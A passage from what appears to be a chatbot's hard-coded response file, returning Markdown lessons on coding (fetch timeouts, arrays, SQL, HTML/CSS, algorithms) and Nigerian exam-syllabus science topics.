2. **Dict-Based Deduplication:** \`dict.fromkeys()\` preserves order while maintaining $O(n)$ efficiency.`;
  }

  // JavaScript & TypeScript Specific
  if (q.includes('javascript') || /\bjs\b/i.test(q) || q.includes('typescript') || /\bts\b/i.test(q)) {
    if (q.includes('fetch') || q.includes('api') || q.includes('async') || q.includes('promise')) {
      return `### 💻 Naija AI Coding Lab: Modern Async/Await Fetch with Timeout in JavaScript/TypeScript

Hello **${name}**! Here is a resilient API request utility with timeout handling and error recovery:

\`\`\`typescript
// Naija AI Modern Fetch Utility with AbortController Timeout
interface FetchOptions extends RequestInit {
  timeoutMs?: number;
}

export async function fetchWithTimeout<T>(
  url: string, 
  options: FetchOptions = {}
): Promise<T> {
  const { timeoutMs = 8000, ...fetchOptions } = options;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(url, {
      ...fetchOptions,
      signal: controller.signal,
      headers: {
        'Content-Type': 'application/json',
        ...(fetchOptions.headers || {})
      }
    });

    if (!response.ok) {
      throw new Error(\`HTTP Error \${response.status}: \${response.statusText}\`);
    }

    return (await response.json()) as T;
  } catch (error: any) {
    if (error.name === 'AbortError') {
      throw new Error(\`Network request to \${url} timed out after \${timeoutMs}ms\`);
    }
    throw error;
  } finally {
    clearTimeout(timer);
  }
}

// Example usage:
// const data = await fetchWithTimeout<{ title: string }>('/api/questions/daily');
\`\`\`

**⚡ Key Engineering Concepts:**
1. **AbortController:** Prevents hanging network requests and memory leaks.
2. **Generic Typing:** Returns strongly typed JSON response (\`Promise<T>\`).`;
    }

    if (q.includes('sort') || q.includes('array')) {
      return `### 💻 Naija AI Coding Lab: JavaScript High-Performance Array Operations

Hello **${name}**! Here is a guide to JavaScript array transformations, sorting, and deduplication:

\`\`\`javascript
// Naija AI JavaScript Array Masterclass
const scores = [85, 42, 98, 77, 98, 64, 85, 90];

// 1. Deduplication using Set (O(n))
const uniqueScores = [...new Set(scores)];

// 2. Numerical Sorting (Ascending & Descending)
// Note: array.sort() sorts alphabetically by default! Always supply a comparator:
const ascending = [...uniqueScores].sort((a, b) => a - b);
const descending = [...uniqueScores].sort((a, b) => b - a);

// 3. Functional Aggregation (reduce)
const totalSum = scores.reduce((acc, curr) => acc + curr, 0);
const average = totalSum / scores.length;

// 4. Object Grouping by Grade
const students = [
  { name: 'Chukwuebuka', score: 88 },
  { name: 'Amina', score: 94 },
  { name: 'Oluwaseun', score: 65 }
];

const honors = students.filter(s => s.score >= 80);

console.log('Unique:', uniqueScores);
console.log('Top Down:', descending);
console.log('Class Average:', average.toFixed(2));
console.log('Honors Roll:', honors);
\`\`\``;
    }
  }

  // SQL & Database Queries
  if (q.includes('sql') || q.includes('database') || q.includes('query') || q.includes('table')) {
    if (q.includes('join')) {
      return `### 💻 Naija AI Coding Lab: SQL JOIN Masterclass (INNER, LEFT, RIGHT, FULL)

Hello **${name}**! Here is the complete breakdown of SQL JOIN operations:

\`\`\`sql
-- 1. INNER JOIN: Returns only rows that match in BOTH tables
SELECT 
    students.id, 
    students.name, 
    scores.subject, 
    scores.score
FROM students
INNER JOIN scores ON students.id = scores.student_id;

-- 2. LEFT JOIN: Returns ALL students, and matching scores if they exist (NULL otherwise)
SELECT 
    students.id, 
    students.name, 
    COALESCE(scores.score, 0) AS final_score
FROM students
LEFT JOIN scores ON students.id = scores.student_id;

-- 3. Aggregation with GROUP BY & HAVING:
-- Find all students with an average score above 75
SELECT 
    students.id, 
    students.name, 
    ROUND(AVG(scores.score), 2) AS average_score,
    COUNT(scores.id) AS total_exams_taken
FROM students
INNER JOIN scores ON students.id = scores.student_id
GROUP BY students.id, students.name
HAVING AVG(scores.score) >= 75
ORDER BY average_score DESC;
\`\`\`

**⚡ Key Takeaways:**
1. \`INNER JOIN\` discards non-matching rows.
2. \`LEFT JOIN\` preserves the parent table records even when foreign keys have no children.
3. \`HAVING\` filters *after* grouping, while \`WHERE\` filters *before* grouping!`;
    }

    return `### 💻 Naija AI Coding Lab: Production-Grade SQL Schema & Indexing

Hello **${name}**! Here is a relational SQL schema with foreign key constraints, indexes, and parameterized queries:

\`\`\`sql
-- Create Users Table with Secure Types
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    full_name VARCHAR(100) NOT NULL,
    membership_tier VARCHAR(20) DEFAULT 'free' CHECK (membership_tier IN ('free', 'basic', 'medium', 'premium')),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Exam Attempts Table with Foreign Key
CREATE TABLE IF NOT EXISTS exam_attempts (
    id SERIAL PRIMARY KEY,
    user_id INT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    subject VARCHAR(50) NOT NULL,
    score INT NOT NULL CHECK (score >= 0 AND score <= 400),
    time_taken_seconds INT NOT NULL,
    attempted_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- High-Performance Indexes for Rapid Dashboard Retrieval
CREATE INDEX idx_exam_attempts_user_id ON exam_attempts(user_id);
CREATE INDEX idx_exam_attempts_subject ON exam_attempts(subject);
\`\`\`

**⚡ Defensive Principle:**
Always use parameterized prepared statements in your backend (e.g. \`SELECT * FROM users WHERE email = $1\`) to mathematically eliminate SQL injection!`;
  }

  // HTML & CSS
  if (q.includes('html') || q.includes('css') || q.includes('flexbox') || q.includes('grid') || q.includes('navbar')) {
    return `### 💻 Naija AI Coding Lab: Modern Responsive HTML5 & CSS3 Layout

Hello **${name}**! Here is a clean, responsive HTML5 & CSS3 layout using modern Flexbox & Grid:

\`\`\`html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>StudyNaija Exam Hub</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
    body { background: #0f172a; color: #f8fafc; padding: 2rem; }
    .container { max-width: 900px; margin: 0 auto; }
    
    /* Responsive Grid */
    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 1.5rem;
      margin-top: 1.5rem;
    }
    
    .card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 1rem;
      padding: 1.5rem;
      transition: transform 0.2s, border-color 0.2s;
    }
    .card:hover { transform: translateY(-4px); border-color: #10b981; }
    
    .btn {
      display: inline-block;
      margin-top: 1rem;
      padding: 0.6rem 1.2rem;
      background: #10b981;
      color: #0f172a;
      font-weight: bold;
      border-radius: 0.5rem;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🇳🇬 StudyNaija Interactive Curriculum</h1>
    <p style="color: #94a3b8;">Choose a subject to launch practice questions:</p>
    
    <div class="grid">
      <div class="card">
        <h3>📐 Mathematics</h3>
        <p style="color: #94a3b8; font-size: 0.9rem;">Calculus, Algebra, Matrices & Quadratic Equations.</p>
        <a href="#math" class="btn">Start Practice</a>
      </div>
      <div class="card">
        <h3>⚡ Physics</h3>
        <p style="color: #94a3b8; font-size: 0.9rem;">Mechanics, Waves, Optics, Electricity & Magnetism.</p>
        <a href="#physics" class="btn">Start Practice</a>
      </div>
      <div class="card">
        <h3>🧪 Chemistry</h3>
        <p style="color: #94a3b8; font-size: 0.9rem;">Organic Chemistry, Stoichiometry & Periodic Table.</p>
        <a href="#chemistry" class="btn">Start Practice</a>
      </div>
    </div>
  </div>
</body>
</html>
\`\`\``;
  }

  // Two Sum / Algorithms
  if (q.includes('two sum') || q.includes('algorithm') || q.includes('binary search') || q.includes('data structure')) {
    if (q.includes('two sum')) {
      return `### 💻 Naija AI Coding Lab: Two Sum Problem (Optimal Hash Map Solution)

Hello **${name}**! Here is the classic "Two Sum" problem solved in Python and JavaScript with optimal $O(n)$ time:

**Problem Statement:** Given an array of integers \`nums\` and an integer \`target\`, return the indices of the two numbers that add up to \`target\`.

\`\`\`python
# Python: O(n) Time and O(n) Space using Hash Map
def two_sum(nums: list[int], target: int) -> list[int]:
    seen: dict[int, int] = {} # maps value -> index
    
    for current_idx, num in enumerate(nums):
        complement = target - num
        if complement in seen:
            return [seen[complement], current_idx]
        seen[num] = current_idx
        
    return []

# Test Case:
nums = [2, 7, 11, 15]
target = 9
print("Indices adding to target:", two_sum(nums, target)) # Output: [0, 1]
\`\`\`

\`\`\`javascript
// JavaScript Implementation:
function twoSum(nums, target) {
  const map = new Map();
  for (let i = 0; i < nums.length; i++) {
    const complement = target - nums[i];
    if (map.has(complement)) {
      return [map.get(complement), i];
    }
    map.set(nums[i], i);
  }
  return [];
}
\`\`\`

**⚡ Algorithmic Breakdown:**
1. Instead of nested loops with $O(n^2)$ time, we use a Hash Map.
2. For each number, checking if \`target - num\` exists in the Hash Map is an $\\mathbf{O(1)}$ average lookup!`;
    }

    if (q.includes('binary search')) {
      return `### 💻 Naija AI Coding Lab: Binary Search Algorithm ($O(\\log n)$)

Hello **${name}**! Binary Search is the bedrock of logarithmic searching. It requires a **sorted array**:

\`\`\`python
def binary_search(arr: list[int], target: int) -> int:
    """Returns index of target if found, else -1. Time: O(log n), Space: O(1)."""
    low = 0
    high = len(arr) - 1
    
    while low <= high:
        # Avoid integer overflow in other languages: mid = low + (high - low) // 2
        mid = (low + high) // 2
        
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            low = mid + 1  # Target is in the right half
        else:
            high = mid - 1 # Target is in the left half
            
    return -1

# Test Run:
sorted_scores = [35, 48, 62, 75, 88, 92, 99]
print("Found 75 at index:", binary_search(sorted_scores, 75)) # Output: 3
print("Found 50 at index:", binary_search(sorted_scores, 50)) # Output: -1
\`\`\`

**⚡ Why $O(\\log n)$?**
With every single iteration, we halve the search space ($N \\to \\frac{N}{2} \\to \\frac{N}{4} \\dots$). Searching through 1,000,000 elements requires only **20 comparisons**!`;
    }
  }

  // =========================================================================
  // 4. ACADEMIC SYLLABUS SUBJECTS (JAMB UTME, WAEC SSCE, NECO, GST)
  // =========================================================================

  // Physics: Mechanics, Motion & Newton's Laws
  if (q.includes('newton') || q.includes('motion') || q.includes('velocity') || q.includes('acceleration') || q.includes('force') || top.includes('motion')) {
    return `### 💡 Naija AI Masterclass: Linear Motion & Newton's Laws of Motion

Hello **${name}**! Mechanics accounts for roughly 25% of JAMB Physics questions. Let's master the formulas:

**1. The Four Equations of Uniformly Accelerated Motion:**
1. $$v = u + at$$
2. $$s = ut + \\frac{1}{2}at^2$$
3. $$v^2 = u^2 + 2as$$
4. $$s = \\left(\\frac{u + v}{2}\\right)t$$
*Where:* $u$ = initial velocity (m/s), $v$ = final velocity (m/s), $a$ = acceleration ($m/s^2$), $s$ = displacement (m), $t$ = time (s).

**2. Vertical Motion Under Gravity ($a = \\pm g$):**
- Moving upwards: $a = -g$. At the maximum height, $\\mathbf{v = 0}$!
  - Maximum height reached: $H = \\frac{u^2}{2g}$
  - Time to reach top: $t = \\frac{u}{g}$
  - Total time of flight: $T = \\frac{2u}{g}$
- Dropped from rest: Initial velocity $\\mathbf{u = 0}$, $a = +g$.

**3. Newton's Three Laws of Motion:**
- **1st Law (Inertia):** A body remains at rest or in uniform motion unless acted upon by a net external force.
- **2nd Law (Force):** The rate of change of momentum is directly proportional to applied force: $\\mathbf{F = ma = \\frac{m(v - u)}{t}}$.
- **3rd Law (Action-Reaction):** For every action, there is an equal and opposite reaction ($F_{AB} = -F_{BA}$).`;
  }

  // Physics: Waves & Optics
  if (q.includes('wave') || q.includes('light') || q.includes('optics') || q.includes('refraction') || q.includes('lens') || q.includes('sound')) {
    return `### 💡 Naija AI Masterclass: Waves, Sound & Optics

Hello **${name}**! Here is the high-yield breakdown for Waves & Optics:

**1. General Wave Equation:**
$$\\mathbf{v = f\\lambda}$$
*Where:* $v$ = wave velocity (m/s), $f$ = frequency (Hz), $\\lambda$ = wavelength (m). Frequency depends *only* on the source and does not change when crossing boundaries!

**2. Transverse vs Longitudinal Waves:**
- **Transverse:** Vibrations are perpendicular to wave propagation (e.g. Light, radio waves, water ripples). Can be polarized!
- **Longitudinal:** Vibrations are parallel to wave propagation (e.g. Sound waves). Requires a material medium; cannot travel in a vacuum; cannot be polarized.

**3. Snell's Law of Refraction:**
$$n = \\frac{\\sin i}{\\sin r} = \\frac{c_1}{c_2} = \\frac{\\text{Real Depth}}{\\text{Apparent Depth}}$$
- **Critical Angle ($C$):** When light travels from a denser to a rarer medium: $\\sin C = \\frac{1}{n}$.
- **Total Internal Reflection:** Occurs when angle of incidence $i > C$.`;
  }

  // Chemistry: Periodic Table & Chemical Bonding
  if (q.includes('periodic') || q.includes('bonding') || q.includes('electron') || q.includes('orbital') || top.includes('periodic')) {
    return `### 💡 Naija AI Masterclass: Atomic Structure, Orbitals & Periodic Trends

Hello **${name}**! Here is the definitive guide to Atomic Structure and Chemical Bonding:

**1. Quantum Principles & Electronic Configuration:**
- **Aufbau Principle:** Electrons fill lower-energy orbitals first ($1s \\to 2s \\to 2p \\to 3s \\to 3p \\to 4s \\to 3d$).
- **Hund's Rule:** In degenerate orbitals ($p_x, p_y, p_z$), electrons occupy singly with parallel spins before pairing up.
- **Pauli Exclusion Principle:** No two electrons in an atom can have the exact same four quantum numbers.

**2. Periodic Trends (Across a Period vs Down a Group):**
- **Atomic Radius:** Decreases across a period (effective nuclear charge increases); increases down a group (new shells added).
- **Ionization Energy & Electronegativity:** Increases across a period; decreases down a group.
- *Most Electronegative Element:* **Fluorine (F)**.

**3. Chemical Bonding Types:**
- **Electrovalent (Ionic):** Complete transfer of valence electrons between metals and non-metals (high melting point, conducts electricity in molten/aqueous state).
- **Covalent:** Sharing of electron pairs between non-metals.
- **Coordinate (Dative) Covalent:** Both shared electrons originate from a single atom (e.g. formation of $NH_4^+$ and $H_3O^+$).`;
  }

  // Chemistry: Acids, Bases, Salts & Titration
  if (q.includes('acid') || (/\bbase\b|\bbases\b/i.test(q) && !q.includes('database')) || q.includes('titrat') || /\bph\b/i.test(q) || q.includes('ph value') || q.includes('ph scale') || /\bsalt\b|\bsalts\b/i.test(q)) {
    return `### 💡 Naija AI Masterclass: Acids, Bases, Salts & Volumetric Titration

Hello **${name}**! Here are the core concepts and calculations tested in JAMB Chemistry:

**1. Fundamental Definitions:**
- **Arrhenius:** Acid produces $H^+$ ions in water; Base produces $OH^-$ ions.
- **Brønsted-Lowry:** Acid is a proton ($H^+$) donor; Base is a proton acceptor.
- **Lewis:** Acid is an electron pair acceptor; Base is an electron pair donor.

**2. pH Calculations:**
$$pH = -\\log_{10}[H^+] \\quad \\text{and} \\quad pH + pOH = 14$$
- Neutral solution: $pH = 7$ at $25^\\circ C$.
- Acidic: $pH < 7$, Alkaline: $pH > 7$.

**3. Volumetric Analysis (Titration Formula):**
$$\\mathbf{\\frac{C_a V_a}{C_b V_b} = \\frac{n_a}{n_b}}$$
*Where:*
- $C_a, C_b$: Molar concentrations ($mol/dm^3$)
- $V_a, V_b$: Titre volumes ($cm^3$)
- $n_a, n_b$: Mole ratio coefficients from the balanced equation.

**Common Indicator Selection:**
- Strong Acid vs Strong Base: Any indicator (Methyl Orange or Phenolphthalein).
- Strong Acid vs Weak Base: **Methyl Orange** (turns pink/red at end-point).
- Weak Acid vs Strong Base: **Phenolphthalein** (turns pink at end-point).`;
  }

  // Biology: Photosynthesis & Respiration
  if (q.includes('photo') || q.includes('respirat') || q.includes('chlorophyll') || q.includes('atp')) {
    return `### 💡 Naija AI Masterclass: Photosynthesis & Cellular Respiration

Hello **${name}**! Here is the comparison of energy transformations in living cells:

**1. Photosynthesis Equation & Stages:**
$$6CO_2 + 6H_2O \\xrightarrow[\\text{Chlorophyll}]{\\text{Light}} C_6H_{12}O_6 + 6O_2$$
- **Light Stage (Thylakoids / Grana):** Solar energy is absorbed by chlorophyll to split water molecules (**Photolysis of water**): $2H_2O \\to 4H^+ + 4e^- + O_2$. Oxygen is released as a byproduct. ATP and NADPH are synthesized.
- **Dark Stage / Calvin Cycle (Stroma):** Light-independent carbon fixation where $CO_2$ is reduced into glucose using ATP and NADPH.

**2. Cellular Respiration (Aerobic vs Anaerobic):**
- **Aerobic Respiration:** $C_6H_{12}O_6 + 6O_2 \\to 6CO_2 + 6H_2O + 38\\text{ ATP}$.
  - Glycolysis (Cytoplasm) $\\to$ Krebs Cycle (Mitochondrial Matrix) $\\to$ Electron Transport Chain (Cristae).
- **Anaerobic Respiration (Fermentation):**
  - In Yeast: Glucose $\\to$ Ethanol + $CO_2$ + 2 ATP.
  - In Human Muscles (Oxygen debt): Glucose $\\to$ Lactic Acid + 2 ATP.`;
  }

  // Biology: Genetics, Blood Groups & Sickle Cell
  if (q.includes('genetic') || q.includes('dna') || q.includes('mendel') || q.includes('blood group') || q.includes('sickle')) {
    return `### 💡 Naija AI Masterclass: Genetics, Heredity & Blood Compatibility

Hello **${name}**! Genetics is tested in 8 to 12 questions annually in JAMB Biology:

**1. Mendel's Laws of Inheritance:**
- **1st Law (Segregation):** Alleles separate during gamete formation so that each gamete carries only one allele for each gene.
  - Monohybrid F2 Phenotypic Ratio: **3 : 1** (3 Dominant : 1 Recessive).
  - Monohybrid F2 Genotypic Ratio: **1 : 2 : 1** ($1 TT : 2 Tt : 1 tt$).
- **2nd Law (Independent Assortment):** Dihybrid F2 Phenotypic Ratio: **9 : 3 : 3 : 1**.

**2. Sickle Cell Anemia & Malaria Resistance:**
- Genotypes: $Hb^A Hb^A$ (Normal), $Hb^A Hb^S$ (Carrier / Trait), $Hb^S Hb^S$ (Sickler).
- **High-Yield WAEC Trap:** Two carriers ($Hb^A Hb^S \\times Hb^A Hb^S$) have a **25% (1 in 4)** probability of having a child with sickle cell disease ($Hb^S Hb^S$). Carriers have selective advantage against falciparum malaria!

**3. ABO Blood Groups & Rhesus Factor:**
- Blood Group **O negative ($O^-$)**: Universal Donor (lacks A, B, and Rh antigens).
- Blood Group **AB positive ($AB^+$)**: Universal Recipient (lacks anti-A, anti-B, and anti-Rh antibodies).
- **Erythroblastosis Fetalis:** Occurs when an $Rh^-$ mother carries an $Rh^+$ fetus for a second or subsequent pregnancy.`;
  }

  // Biology: Cell Structure, Organelles, Osmosis & Diffusion
  if (q.includes('cell') || q.includes('mitochondria') || q.includes('osmosis') || q.includes('diffusion') || q.includes('nucleus') || q.includes('organelle')) {
    return `### 🔬 Naija AI Masterclass: Cell Biology, Organelles & Transport

Hello **${name}**! Cell biology is fundamental to WAEC and JAMB Biology. Here is the complete breakdown:

**1. Plant Cells vs Animal Cells:**
- **Plant Cells:** Have a rigid **Cellulose Cell Wall**, **Chloroplasts** (for photosynthesis), and a **Large Central Vacuole**.
- **Animal Cells:** Have only a flexible cell membrane, no chloroplasts, and small temporary vacuoles or lysosomes.

**2. Key Organelles & Their Functions:**
- **Nucleus:** Houses genetic material (DNA/chromosomes); controls all cell activities.
- **Mitochondria (The Powerhouse):** Site of cellular aerobic respiration where ATP (energy currency) is generated.
- **Ribosomes:** Sites of protein synthesis.
- **Endoplasmic Reticulum (ER):** Rough ER (studded with ribosomes) synthesizes proteins; Smooth ER synthesizes lipids.
- **Golgi Apparatus:** Packages, modifies, and secretes cellular products.

**3. Transport Mechanisms:**
- **Diffusion:** Movement of solute particles from a region of higher concentration to lower concentration down a concentration gradient (passive, no energy).
- **Osmosis:** Movement of **water molecules** from a region of higher water potential (dilute solution) to lower water potential (concentrated solution) across a **semi-permeable membrane**.
- **Active Transport:** Movement of substances against a concentration gradient requiring **ATP energy** and carrier proteins.`;
  }

  // Biology: Human Body Systems (Circulation, Digestion, Excretion, Respiration, Nervous System)
  if (
    q.includes('heart') || q.includes('blood') || q.includes('digest') || q.includes('kidney') ||
    q.includes('lung') || q.includes('brain') || q.includes('neuron') || q.includes('hormone') ||
    q.includes('enzyme') || q.includes('respiratory') || q.includes('excret')
  ) {
    return `### 🫀 Naija AI Masterclass: Human Body Physiology & Anatomy

Hello **${name}**! Here is the high-yield breakdown of human physiological systems:

**1. Circulatory System & The Heart:**
- **Double Circulation:** Blood passes through the 4-chambered heart twice during each complete circuit (Pulmonary circuit to lungs, Systemic circuit to the body).
- **Arteries vs Veins:**
  - **Arteries:** Carry oxygenated blood away from the heart at high pressure (thick muscular walls, no valves; *Exception:* Pulmonary artery carries deoxygenated blood).
  - **Veins:** Carry deoxygenated blood toward the heart at low pressure (thin walls, possess valves to prevent backflow; *Exception:* Pulmonary vein).
- **Blood Components:** Red blood cells (erythrocytes, carry $O_2$ via hemoglobin, no nucleus), White blood cells (leukocytes, immune defense), Platelets (thrombocytes, blood clotting), Plasma (transport medium).

**2. Digestive System & Enzymes:**
- **Mouth:** Salivary amylase (ptyalin) digests cooked starch into maltose (neutral/alkaline pH).
- **Stomach:** Gastric juice contains $HCl$ (kills bacteria, activates pepsin) and **Pepsin** (digests proteins into peptones in acidic pH).
- **Small Intestine (Duodenum & Ileum):**
  - **Bile:** Produced in liver, stored in gallbladder, emulsifies fats.
  - **Pancreatic Juice:** Amylase, Trypsin (proteins $\to$ peptides), Lipase (fats $\to$ fatty acids + glycerol).
  - **Absorption:** Occurs in the ileum via millions of tiny finger-like **villi**.

**3. Excretory System (The Kidneys):**
- **Nephron:** Functional unit of the kidney.
- **Ultrafiltration:** Occurs in the Bowman's capsule under high hydrostatic pressure from the glomerulus.
- **Selective Reabsorption:** Glucose, amino acids, and water are reabsorbed in the proximal convoluted tubule and loop of Henle.

**4. Nervous System & Reflex Arc:**
- **Reflex Arc Pathway:** Receptor $\to$ Sensory Neuron $\to$ Relay/Interneuron (Spinal Cord) $\to$ Motor Neuron $\to$ Effector (Muscle/Gland).
- Rapid, involuntary, automatic response that protects the body from injury!`;
  }

  // Physics: Work, Energy, Power & Gravitation
  if (q.includes('work') && q.includes('energy') || q.includes('gravity') || q.includes('gravitat') || q.includes('power') && q.includes('watt') || q.includes('kinetic energy') || q.includes('potential energy')) {
    return `### ⚡ Naija AI Masterclass: Work, Energy, Power & Gravitation

Hello **${name}**! Here are the core formulas and conceptual rules for Work, Energy, and Gravity:

**1. Work, Energy & Power:**
- **Work Done ($W$):** Product of force and displacement in the direction of the force:
  $$W = F \\times d \\times \\cos\\theta \\quad (\\text{measured in Joules, J})$$
- **Kinetic Energy ($KE$):** Energy of a body due to its motion:
  $$KE = \\frac{1}{2}mv^2$$
- **Gravitational Potential Energy ($PE$):** Energy due to position or height:
  $$PE = mgh$$
- **Law of Conservation of Mechanical Energy:** In an isolated system without friction:
  $$KE_1 + PE_1 = KE_2 + PE_2 = \\text{Constant}$$
- **Power ($P$):** Rate of doing work or transferring energy:
  $$P = \\frac{W}{t} = F \\times v \\quad (\\text{measured in Watts, W})$$

**2. Newton's Universal Law of Gravitation:**
- Every particle in the universe attracts every other particle with a force directly proportional to the product of their masses and inversely proportional to the square of the distance between them:
  $$F = G\\frac{m_1 m_2}{r^2} \\quad (G = 6.67 \\times 10^{-11} \\text{ N}\\cdot\\text{m}^2/\\text{kg}^2)$$
- **Mass vs Weight:**
  - **Mass ($m$):** Quantity of matter in a body (constant everywhere, scalar, kg).
  - **Weight ($W = mg$):** Force of gravity acting on a body (varies with location, vector, Newtons).`;
  }

  // Physics: Heat, Temperature, Thermodynamics & Gas Laws
  if (q.includes('heat') || q.includes('thermodynamic') || q.includes('boyle') || q.includes('charles') || q.includes('temperature') || q.includes('gas law') || q.includes('conduction') || q.includes('convection')) {
    return `### 🔥 Naija AI Masterclass: Thermal Physics & Gas Laws

Hello **${name}**! Thermal physics accounts for frequent calculation and objective questions in JAMB and WAEC:

**1. Heat Transfer Mechanisms:**
- **Conduction:** Transfer of heat through direct contact in solids without bulk movement of matter (metals are good conductors via free electrons).
- **Convection:** Transfer of heat in fluids (liquids and gases) via density currents (warm fluid expands, becomes less dense, and rises).
- **Radiation:** Heat transfer via electromagnetic waves (infrared); requires **no material medium** and can travel across a vacuum (how sunlight reaches Earth).

**2. Quantity of Heat & Heat Capacity:**
- **Heat Required for Temperature Change:**
  $$Q = mc\\Delta\\theta$$
  *Where:* $m$ = mass (kg), $c$ = specific heat capacity ($\\text{J}/(\\text{kg}\\cdot\\text{K})$), $\\Delta\\theta$ = change in temperature.
- **Latent Heat (Phase Change at Constant Temperature):**
  $$Q = mL$$
  *Where:* $L_f$ = latent heat of fusion (solid $\\leftrightarrow$ liquid); $L_v$ = latent heat of vaporization (liquid $\\leftrightarrow$ gas).

**3. The Fundamental Gas Laws:**
- **Boyle's Law ($T$ constant):** Volume of a fixed mass of gas is inversely proportional to pressure:
  $$P_1 V_1 = P_2 V_2$$
- **Charles' Law ($P$ constant):** Volume is directly proportional to absolute temperature (in Kelvin):
  $$\\frac{V_1}{T_1} = \\frac{V_2}{T_2} \\quad (T = \\theta^\\circ\\text{C} + 273)$$
- **Pressure Law ($V$ constant):** $\\frac{P_1}{T_1} = \\frac{P_2}{T_2}$.
- **General / Ideal Gas Equation:**
  $$\\frac{P_1 V_1}{T_1} = \\frac{P_2 V_2}{T_2} \\quad \\text{or} \\quad PV = nRT$$`;
  }

  // Physics: Electricity, Circuits, Resistance & Ohm's Law
  if (q.includes('ohm') || q.includes('resistor') || q.includes('circuit') || q.includes('current') || q.includes('voltage') || q.includes('electric power') || q.includes('transformer')) {
    return `### ⚡ Naija AI Masterclass: Current Electricity & Circuits

Hello **${name}**! Here is the complete formula guide for Current Electricity:

**1. Ohm's Law:**
- The electric current ($I$) flowing through a metallic conductor is directly proportional to the potential difference ($V$) across its ends, provided temperature and other physical conditions remain constant:
  $$\\mathbf{V = IR}$$
  *Where:* $V$ = Voltage (Volts, V), $I$ = Current (Amperes, A), $R$ = Resistance (Ohms, $\\Omega$).

**2. Resistors in Series vs Parallel:**
- **Series Circuit:**
  - Same current through all components: $I_T = I_1 = I_2$.
  - Total Resistance: $R_{\\text{total}} = R_1 + R_2 + R_3$.
  - Voltages add up: $V_{\\text{total}} = V_1 + V_2 + V_3$.
- **Parallel Circuit:**
  - Same voltage across all branches: $V_T = V_1 = V_2$.
  - Total Resistance: $\\frac{1}{R_{\\text{total}}} = \\frac{1}{R_1} + \\frac{1}{R_2} + \\dots$
  - Currents add up: $I_{\\text{total}} = I_1 + I_2 + \\dots$
  - Shortcut for 2 resistors in parallel: $R_p = \\frac{R_1 R_2}{R_1 + R_2}$.

**3. Electrical Power & Energy:**
- Power: $P = IV = I^2 R = \\frac{V^2}{R} \\quad (\\text{Watts})$.
- Energy: $E = P \\times t = IVt \\quad (\\text{Joules or kWh})$.

**4. Transformers:**
- $\\frac{V_s}{V_p} = \\frac{N_s}{N_p} = \\frac{I_p}{I_s}$
- **Step-Up:** $N_s > N_p$, voltage increases, current decreases.
- **Step-Down:** $N_s < N_p$, voltage decreases, current increases.`;
  }

  // Chemistry: Organic Chemistry & Hydrocarbons
  if (q.includes('organic') || q.includes('alkane') || q.includes('alkene') || q.includes('alkyne') || q.includes('alcohol') || q.includes('hydrocarbon') || q.includes('petroleum') || q.includes('crude oil')) {
    return `### 🧪 Naija AI Masterclass: Organic Chemistry & Hydrocarbons

Hello **${name}**! Organic chemistry makes up roughly 20% of JAMB Chemistry questions:

**1. Homologous Series of Hydrocarbons:**
- **Alkanes (Saturated):** Single $C-C$ covalent bonds only.
  - General formula: $\\mathbf{C_n H_{2n+2}}$ (Methane $CH_4$, Ethane $C_2H_6$, Propane $C_3H_8$).
  - Undergo **Substitution Reactions** (e.g. chlorination under UV light).
- **Alkenes (Unsaturated):** Contain at least one $C=C$ double bond.
  - General formula: $\\mathbf{C_n H_{2n}}$ (Ethene $C_2H_4$, Propene $C_3H_6$).
  - Undergo **Addition Reactions**; decolorize reddish-brown bromine water and purple acidified $KMnO_4$.
- **Alkynes (Unsaturated):** Contain a $C\\equiv C$ triple bond.
  - General formula: $\\mathbf{C_n H_{2n-2}}$ (Ethyne / Acetylene $C_2H_2$).

**2. Functional Groups Overview:**
- **Alkanols (Alcohols):** Functional group $-OH$ (e.g. Ethanol $C_2H_5OH$).
- **Alkanoic Acids (Carboxylic Acids):** Functional group $-COOH$ (e.g. Ethanoic acid $CH_3COOH$).
- **Esters (Fruity scents):** Formed via **Esterification**:
  $$\\text{Alkanol} + \\text{Alkanoic Acid} \\xrightleftharpoons{\\text{conc. } H_2SO_4} \\text{Ester} + \\text{Water}$$

**3. Fractional Distillation of Crude Oil:**
- Separates petroleum into fractions based on **differences in boiling points**:
  1. Refinery Gases ($< 20^\\circ C$ - cooking gas/LPG).
  2. Petrol / Gasoline ($40-205^\\circ C$ - car fuel).
  3. Kerosene / Paraffin ($175-325^\\circ C$ - jet fuel, domestic stove).
  4. Diesel oil ($250-350^\\circ C$ - trucks, generators).
  5. Lubricating oil, Bitumen/Asphalt (residue - road surfacing).`;
  }

  // Astronomy, Solar System, Planets, Earth & Seasons
  if (q.includes('planet') || q.includes('solar system') || q.includes('sun') || q.includes('moon') || q.includes('eclipse') || q.includes('black hole') || q.includes('galaxy') || q.includes('season') || q.includes('orbit')) {
    return `### 🌌 Naija AI Space & Astronomy: The Solar System & Earth Science

Hello **${name}**! Here is the complete breakdown of our Solar System and Astronomical Science:

**1. The 8 Planets in Order from the Sun:**
- *Mnemonic:* **M**y **V**ery **E**ducated **M**other **J**ust **S**erved **U**s **N**oodles!
1. **Mercury:** Smallest planet, closest to the Sun, extreme temperature swings, no atmosphere.
2. **Venus:** "Morning/Evening Star", hottest planet (thick $CO_2$ runaway greenhouse effect), rotates clockwise (retrograde).
3. **Earth:** Our home planet, 71% water, liquid hydrosphere, life-supporting oxygen-nitrogen atmosphere.
4. **Mars:** The "Red Planet" (iron oxide surface), home to Olympus Mons (largest volcano).
5. **Jupiter:** Largest planet, gas giant, famous "Great Red Spot" storm.
